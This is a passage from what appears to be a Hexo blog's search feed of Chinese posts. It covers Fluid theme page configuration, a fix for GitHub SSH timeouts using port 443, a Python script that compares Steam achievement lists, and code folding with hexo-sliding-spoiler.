style="color: #D4D4D4">  </span><span style="color: #6A9955">// 增加点击区域</span></span></code></pre></div></div></figure><p>该样式将会与友情链接的各小项目表现一致。例如：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505151556536.png" alt="image-20250515155622458"></p><p>并且在移动端也将有较为良好的显示效果：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505160609910.png" alt="image-20250516060905783"></p><h2 id="在_configfluidyml中进行配置"><a class="markdownIt-Anchor" href="#在_configfluidyml中进行配置"></a> 在_config.fluid.yml 中进行配置</h2><p>使用 ejs 渲染模板，就可以在<code>.md</code> 文档中使用 <code>layout</code> 来指定渲染，并且可以在 config 文件中进行简单配置就完成渲染。</p><p>在 fluid 的 config 文件中，配置如下：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">#---------------------------</span></span><span class="line"><span style="color: #6A9955"># 导航页</span></span><span class="line"><span style="color: #6A9955"># collections Page</span></span><span class="line"><span style="color: #6A9955">#---------------------------</span></span><span class="line"><span style="color: #569CD6">collections</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">enable</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">title</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"我的收藏"</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">subtitle</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"整理的一些有趣内容"</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">banner_img</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">banner_img_height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">80</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">banner_mask_alpha</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0.3</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 标题层级，支持 2 ~ 6，默认 4（对应 h2 ~ h6）以优化SEO</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">heading_level</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">2</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 标题样式配置（可选）</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">heading_style</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"#333333"</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 标题文字颜色</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">border_bottom</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"1px solid #ddd"</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 标题下边框样式</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">margin</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"0 0 1rem 0"</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 标题外边距（上右下左）</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">font_size</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"1.25rem"</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 标题字体大小</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 头像加载失败时的替代图片</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">onerror_avatar</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">/img/avatar/emo.webp</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 分类列表</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">categories</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    - </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"快捷访问"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">items</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">        - </span><span style="color: #569CD6">title</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"Can I use"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">link</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"https://caniuse.com/"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">avatar</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"https://caniuse.com/img/favicon-128.png"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">intro</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"前端 API 兼容性查询"</span></span><span class="line"><span style="color: #D4D4D4">        - </span><span style="color: #569CD6">title</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"Squoosh"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">link</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"https://squoosh.app/"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">avatar</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"https://notes.fe-mm.com/icons/squoosh.png"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">intro</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"基于浏览器的本地图片压缩工具（支持自定义参数和格式转换）"</span></span><span class="line"><span style="color: #D4D4D4">    - </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"周刊|博客"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">items</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">        - </span><span style="color: #569CD6">title</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"Frontend Weekly"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">link</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"https://frontender-ua.medium.com/"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">avatar</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"https://notes.fe-mm.com/icons/frontender-ua.png"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">intro</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"前端周刊"</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 自定义底部HTML内容，支持HTML标签</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">custom</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">enable</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">content</span><span style="color: #D4D4D4">: </span><span style="color: #C586C0">|</span></span><span class="line"><span style="color: #CE9178">      &lt;div style="text-align:center; margin-top: 2rem;"&gt;</span></span><span class="line"><span style="color: #CE9178">        欢迎来访我的收藏页面！如果你有好用的网站，欢迎推荐～</span></span><span class="line"><span style="color: #CE9178">      &lt;/div&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955"># 评论设置</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">comments</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">enable</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">false</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">type</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">giscus</span></span></code></pre></div></div></figure><p>当然，你也可以使用自定义的 css 再精细的控制一下样式。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> fluid </tag>
            
            <tag> ejs </tag>
            
            <tag> styl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 通过 git 的 ssh 链接 github 超时 (time out)</title>
      <link href="/posts/10729.html"/>
      <url>/posts/10729.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><p>最近在提交 hexo 文章时，遇到了 git 通过 ssh 链接 github 超时 time out 的问题，终端上的黄字非常具有迷惑性：<mark>Error: Spawn failed!</mark></p><p>使用 <code>ssh -T git@github.com</code> 进行测试也是如此。</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">$</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ssh</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-T</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">git@github.com</span></span><span class="line"><span style="color: #DCDCAA">ssh:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">connect</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">to</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">host</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">github.com</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">port</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">22</span><span style="color: #CE9178">:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Connection</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">timed</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">out</span></span></code></pre></div></div></figure><p>实际上是 git 在尝试使用端口 22 链接超时而已，我们可以将其改为 443 再链接。</p><h2 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h2><ol><li><p>找到你生成 rsa 的地方，它可能是 <code>C:\Users\Name\.ssh</code><br>还记得吗？你曾通过 <code>ssh-keygen -t rsa -C "你的git绑定的邮箱名字"</code> 这样一个命令生成了一个 rsa 文件（<a href="https://zhuanlan.zhihu.com/p/193140870">我不记得了 (≧﹏ ≦)</a>）</p></li><li><p>修改或创建一个 <code>config</code> 文件写入以下代码：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">Host github.com</span></span><span class="line"><span style="color: #D4D4D4">HostName ssh.github.com</span></span><span class="line"><span style="color: #D4D4D4">User git</span></span><span class="line"><span style="color: #D4D4D4">Port 443</span></span><span class="line"><span style="color: #D4D4D4">PreferredAuthentications publickey</span></span><span class="line"><span style="color: #D4D4D4">IdentityFile ~/.ssh/id_rsa</span></span></code></pre></div></div></figure><p>这样就能将访问的 <code>github.com</code> 转换为 <code>ssh.github.com</code></p></li></ol><p>请注意，<code>~/</code> 是你要进行填充的地方，<code>~</code> 取决于你的 rsa 的保存位置。例如：<code>C:/Users/Administrator/.ssh/id_rsa</code></p><p>完成上述操作之后你就可以通过以下命令进行尝试：</p><figure class="shiki shell"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">$</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">ssh</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-T</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">git@github.com</span></span><span class="line"><span style="color: #DCDCAA">Hi</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">4</span><span style="color: #CE9178">rozeN!</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">You've successfully authenticated, but GitHub does not provide shell access.</span></span></code></pre></div></div></figure><p>成功的话，它会提示你已成功通过身份验证，但 GitHub 不提供 shell 访问权限，这是正常的。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/the__future/article/details/130038818">关于本地 git 通过 ssh 链接 github 时 time out 问题的解决方法</a></p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> git </tag>
            
            <tag> github </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam 游戏全成就查漏补缺脚本</title>
      <link href="/posts/39978.html"/>
      <url>/posts/39978.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="由于 Steam 会根据你的游戏进度或者说成就进度，将一些成就隐藏起来，这导致你无法查看全部成就详情，哪怕能查看，如果游戏成就项足够多，玩家想要知道自己还剩具体的哪些成就没完成将是一个工作负担较大的事。该脚本可以帮你省去查找已解锁成就和比对环节。"><div class="note info flat"><p>项目地址 Github：<a href="https://github.com/4rozeN/diffAchievements">diffAchievements</a></p></div><h2 id="关于"><a class="markdownIt-Anchor" href="#关于"></a> 关于</h2><p>diffAchievements 是一个获取 Steam 某一个特定的游戏的已解锁成就与全成就列表进行比对得到未解锁成就列表的工具脚本。</p><p>旨在帮助玩家更好的达成某游戏的全成就，或是进行查漏补缺。</p><h2 id="我为什么需要它"><a class="markdownIt-Anchor" href="#我为什么需要它"></a> 我为什么需要它</h2><p>由于 Steam 会根据你的游戏进度或者说成就进度，将一些成就隐藏起来，这导致你无法查看全部成就详情，哪怕能查看，<strong>如果游戏成就项足够多，玩家想要知道自己还剩具体的哪些成就没完成将是一个工作负担较大的事。</strong></p><p>该脚本可以帮你省去查找已解锁成就和比对环节，你只需为脚本提供你的某个游戏的当前成就进度页面地址。</p><p>该地址应当是：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">https://steamcommunity.com/id/430426/stats/2358720/?tab</span><span style="color: #D4D4D4">=achievements</span></span></code></pre></div></div></figure><p>示例图如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181826412.png" alt="image-20250118182611298" style="zoom:50%;"></p><p>该页面可以在<code>个人资料-&gt;所有最近玩过的-&gt;我的游戏统计数据-&gt;我的成就</code>中找到：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181841996.png" alt="image-20250118184103953" style="zoom:50%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181841155.png" alt="image-20250118184157100" style="zoom:50%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181843856.png" alt="image-20250118184303810" style="zoom:50%;"></p><h2 id="设置成就可见性"><a class="markdownIt-Anchor" href="#设置成就可见性"></a> 设置成就可见性</h2><p>为了可以通过网络请求访问到你的游戏成就详情，请在 Steam 的隐私设置中将游戏详情一项设置为公开。</p><p>这将使得你的某个游戏成就进度可以通过以下链接进行访问：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">https://steamcommunity.com/id/yourId/edit/settings</span></span></code></pre></div></div></figure><p>该设置示例图为：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501181828813.png" alt="image-20250118182813774" style="zoom:50%;"></p><h2 id="准备全成就文档"><a class="markdownIt-Anchor" href="#准备全成就文档"></a> 准备全成就文档</h2><p>此项废弃，现在并不需要你准备一份全成就的列表，脚本将自动通过全球玩家成就表进行解析。</p><p><strong>请注意！</strong><mark>某些游戏在全球成就表下部分成就的说明<strong>会被隐藏</strong>，故脚本保存的部分也会隐藏。若有需要，只得自行进行搜索成就详情说明。</mark></p><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><p>将仓库 clone 或下载到本地目录中，例如：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">clone</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">https://github.com/4rozeN/diffAchievements.git</span></span></code></pre></div></div></figure><p>若无法下载，可以<a href="https://wwte.lanzouu.com/i1Xyv2la600f">点这里</a>使用蓝奏云进行下载。</p><p>进入项目目录，使用 python 命令运行：</p><figure class="shiki shell"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">python</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">diffAchievements.py</span></span></code></pre></div></div></figure><p><strong>该命令要求 python 拥有环境变量。</strong></p><p>根据提示输入必要信息即可。</p><h2 id="一份使用示例"><a class="markdownIt-Anchor" href="#一份使用示例"></a> 一份使用示例</h2><figure class="shiki shell"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">PS</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">E:</span><span style="color: #D7BA7D">\C</span><span style="color: #CE9178">oding</span><span style="color: #D7BA7D">\p</span><span style="color: #CE9178">y</span><span style="color: #D7BA7D">\d</span><span style="color: #CE9178">iffAchievement</span><span style="color: #D4D4D4">s&gt; </span><span style="color: #CE9178">python</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">.</span><span style="color: #D7BA7D">\d</span><span style="color: #CE9178">iffAchievements.py</span></span><span class="line"><span style="color: #DCDCAA">请选择steam响应语言（Chinese/English）：c</span></span><span class="line"><span style="color: #DCDCAA">已选择中文作为Steam响应语言。</span></span><span class="line"><span style="color: #DCDCAA">请输入游戏的个人成就进度页面地址URL（例如：https://steamcommunity.com/id/43xxx123/stats/2358720/achievements/）：https://steamcommunity.com/id/430426/stats/578080/?tab</span><span style="color: #D4D4D4">=achievements</span></span><span class="line"><span style="color: #DCDCAA">是否开启代理？(y/n</span><span style="color: #D4D4D4">): y</span></span><span class="line"><span style="color: #DCDCAA">请输入代理地址（例如：http://127.0.0.1:7897）：http://127.0.0.1:7897</span></span><span class="line"><span style="color: #DCDCAA">已开启代理：http://127.0.0.1:7897</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">请求成功，正在解析页面...</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">正在将</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">unlocked_achievements</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">保存到当前目录下的</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">unlocked_achievements.txt</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">文件中...</span></span><span class="line"><span style="color: #DCDCAA">unlocked_achievements.txt</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">文件已保存。</span></span><span class="line"><span style="color: #DCDCAA">将保存的成就总数为:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">19</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">项。</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">请求成功，正在解析页面...</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">正在将</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">all_achievements</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">保存到当前目录下的</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">all_achievements.txt</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">文件中...</span></span><span class="line"><span style="color: #DCDCAA">all_achievements.txt</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">文件已保存。</span></span><span class="line"><span style="color: #DCDCAA">将保存的成就总数为:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">36</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">项。</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">找到的差异成就总数为:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">17</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">项。</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">正在将</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">diff_achievements</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">保存到当前目录下的</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">diff_achievements.txt</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">文件中...</span></span><span class="line"><span style="color: #DCDCAA">diff_achievements.txt</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">文件已保存。</span></span><span class="line"><span style="color: #DCDCAA">将保存的成就总数为:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">17</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">项。</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">程序终了。</span></span><span class="line"><span style="color: #DCDCAA">PS</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">E:</span><span style="color: #D7BA7D">\C</span><span style="color: #CE9178">oding</span><span style="color: #D7BA7D">\p</span><span style="color: #CE9178">y</span><span style="color: #D7BA7D">\d</span><span style="color: #CE9178">iffAchievement</span><span style="color: #D4D4D4">s&gt;</span></span></code></pre></div></div></figure><p>最终将生成三份 txt 文件于脚本同目录下：</p><ol><li><code>all_achievements.txt</code></li><li><code>diff_achievements.txt</code></li><li><code>unlocked_achievements.txt</code></li></ol><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 我的方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 全成就帮手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 博客 Fluid 主题实现代码折叠和文字遮盖效果</title>
      <link href="/posts/41513.html"/>
      <url>/posts/41513.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="方案"><a class="markdownIt-Anchor" href="#方案"></a> 方案</h2><p>hexo 博客默认是没有代码折叠功能的，如果需要实现代码折叠功能，可以安装 hexo-sliding-spoiler 库、借助 Hexo 过滤器功能或者更换代码高亮渲染引擎。</p><ul><li><a href="https://github.com/fletchto99/hexo-sliding-spoiler">hexo-sliding-spoiler</a></li><li><a href="https://kiyanyang.github.io/posts/c4dd4019/">使用 Hexo 过滤器实现代码折叠 By Kiyan</a></li></ul><h2 id="hexo-sliding-spoiler实现代码折叠"><a class="markdownIt-Anchor" href="#hexo-sliding-spoiler实现代码折叠"></a> hexo-sliding-spoiler 实现代码折叠</h2><blockquote><p>hexo-sliding-spoiler 提供 demo 演示：<a href="https://github.com/fletchto99/hexo-sliding-spoiler/blob/master/img/example.gif">https://github.com/fletchto99/hexo-sliding-spoiler/blob/master/img/example.gif</a></p></blockquote><p>安装命令</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">hexo-sliding-spoiler</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--save</span></span><span class="line"><span style="color: #6A9955"># or using yarn</span></span><span class="line"><span style="color: #DCDCAA">yarn</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">add</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">hexo-sliding-spoiler</span></span></code></pre></div></div></figure><p>使用示例</p><figure class="shiki markdown"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{% spoiler title %}</span></span><span class="line"><span style="color: #D4D4D4">content</span></span><span class="line"><span style="color: #D4D4D4">{% endspoiler %}</span></span></code></pre></div></div></figure><p>带空格的需要使用双引号</p><figure class="shiki markdown"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{% spoiler "Several spaces in the title" %}</span></span><span class="line"><span style="color: #D4D4D4">content</span></span><span class="line"><span style="color: #D4D4D4">{% endspoiler %}</span></span></code></pre></div></div></figure><p>如果没起作用，可能是 hexo 没有检测到插件，可以到<code>_config.yml</code> 中加上</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">plugins</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4"> - </span><span style="color: #CE9178">hexo-sliding-spoiler</span></span></code></pre></div></div></figure><p>使用示例</p><div class="spoiler collapsed">    <div class="spoiler-title">        title    </div>    <div class="spoiler-content">        <figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Hello, world!"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">console</span><span 